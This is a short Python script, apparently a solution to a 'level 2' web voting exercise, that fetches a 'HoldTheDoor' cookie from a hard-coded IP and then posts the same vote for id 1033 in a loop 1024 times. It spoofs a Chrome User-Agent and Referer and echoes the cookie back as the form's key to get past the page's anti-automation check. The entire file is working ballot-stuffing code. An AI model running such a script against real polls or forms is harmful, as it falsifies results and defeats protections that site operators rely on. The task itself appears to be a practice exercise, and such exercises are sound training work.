#!/usr/bin/python
import requests
url = 'http://158.69.76.135/level2.php'
x = requests.get(url)
cookie = x.cookies.get('HoldTheDoor')
print(cookie)
url = 'http://158.69.76.135/level2.php'
headers = {
  'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Safari/537.36',
  'Referer': 'http://158.69.76.135/level2.php'
}
data = {
  'id': '1033',
  'holdthedoor': 'Valider',
  'key': cookie
}

cookies = {
  'HoldTheDoor' : cookie,
}
i = 0
while i < 1024:
    requests.post(url, headers=headers, data=data, cookies=cookies)
    i += 1
